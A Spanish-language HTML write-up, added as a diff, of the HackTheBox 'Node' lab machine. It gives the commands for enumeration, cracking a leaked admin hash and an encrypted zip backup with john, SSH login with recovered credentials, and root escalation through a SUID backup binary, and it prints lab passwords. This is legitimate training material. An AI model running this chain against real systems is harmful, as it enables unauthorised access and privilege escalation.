@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - Node | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-success fs-6">Medium</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">Node.js</span>
+        <span class="badge bg-secondary">API</span>
+        <span class="badge bg-secondary">MongoDB</span>
+        <span class="badge bg-secondary">SUID</span>
+        <span class="badge bg-secondary">zip2john</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Node</h1>
+      <p class="text-secondary mb-3">API Node.js expone hashes; backup cifrado crackeable; MongoDB para pivotar; SUID binary para escalada root.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">dirb</span>
+        <span class="badge bg-dark border border-secondary p-2">john</span>
+        <span class="badge bg-dark border border-secondary p-2">zip2john</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p22,3000 -Pn -n 10.10.10.58 -oN targeted</code></pre>
+      </div><img src="img/htb-node/203251.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-globe"></i> Puerto 3000 - API Node.js</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>dirb http://10.10.10.58:3000 -a "gaogao"</code></pre>
+      </div><img src="img/htb-node/193242.png" class="img-fluid rounded mb-3 border border-secondary" alt="dirb">
+      <img src="img/htb-node/193521.png" class="img-fluid rounded mb-3 border border-secondary" alt="source code">
+      <img src="img/htb-node/192522.png" class="img-fluid rounded mb-3 border border-secondary" alt="API users">
+      <p class="text-secondary">En <code>/api/users</code> encontramos hashes SHA256 de contrasenas:</p>
+      <div class="code-block mb-3"><pre><code>myP14ceAdm1nAcc0uNT: dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
+# Crackeado: manchester</code></pre></div><img src="img/htb-node/191641.png" class="img-fluid rounded mb-3 border border-secondary" alt="crackstation">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-archive"></i> Backup cifrado - Password cracking</h4>
+      <img src="img/htb-node/190045.png" class="img-fluid rounded mb-3 border border-secondary" alt="admin panel">
+      <img src="img/htb-node/190946.png" class="img-fluid rounded mb-3 border border-secondary" alt="backup">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>cat myplace.backup | base64 -d > myplace
+zip2john myplace > myplace.john
+john --wordlist=/usr/share/wordlists/rockyou.txt myplace.john
+# password: magicword
+unzip myplace</code></pre>
+      </div><img src="img/htb-node/202849.png" class="img-fluid rounded mb-3 border border-secondary" alt="mongodb credentials">
+      <div class="code-block mb-3"><pre><code>mark: 5AYRft73VtFpc84k</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-terminal"></i> SSH + MongoDB + SUID</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>ssh mark@10.10.10.58
+ps aux | grep tom</code></pre>
+      </div><img src="img/htb-node/225521.png" class="img-fluid rounded mb-3 border border-secondary" alt="process">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>cat /var/scheduler/app.js</code></pre>
+      </div><img src="img/htb-node/224245.png" class="img-fluid rounded mb-3 border border-secondary" alt="app.js">
+      <img src="img/htb-node/223159.png" class="img-fluid rounded mb-3 border border-secondary" alt="mongodb">
+      <p class="text-secondary">Encontramos un binario SUID para escalada:</p>
+      <img src="img/htb-node/230554.png" class="img-fluid rounded mb-3 border border-secondary" alt="suid">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>export HOME=/root
+backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~"</code></pre>
+      </div><img src="img/htb-node/004152.png" class="img-fluid rounded mb-3 border border-secondary" alt="root flag">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>Las APIs REST que exponen hashes de contrasena sin autenticacion son una vulnerabilidad critica.</li>
+<li>Los backups ZIP cifrados pueden ser crackeados con zip2john + john.</li>
+<li>Los binarios SUID con rutas relativas son vulnerables a PATH hijacking.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
